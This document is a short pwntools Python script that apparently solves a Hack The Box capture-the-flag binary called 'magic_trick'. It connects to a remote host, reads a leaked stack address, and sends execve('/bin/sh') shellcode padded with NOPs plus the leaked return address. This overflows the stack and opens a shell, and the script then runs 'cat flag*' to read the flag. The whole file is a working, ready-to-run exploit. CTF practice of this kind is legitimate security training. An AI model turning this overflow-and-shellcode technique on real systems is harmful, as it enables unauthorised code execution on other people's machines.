#!/usr/bin/python3.10
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'info'

fname = './magic_trick' 

LOCAL = False

#os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '83.136.254.234'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 31886
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')

# Read stack leak
r.recvuntil("is '")
leak = int(r.recvuntil("'")[:-1], 16)
print(f'Leak: {leak:#04x}')

# Proceed to Bof
r.sendlineafter('>> ', 'y')

sc = asm(shellcraft.execve('/bin/sh'))
nop = b'\x90'

r.sendlineafter('>> ', sc.ljust(0x48, nop) + p64(leak))

# Read flag
pause(1)
r.sendline('cat flag*')
print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n') 
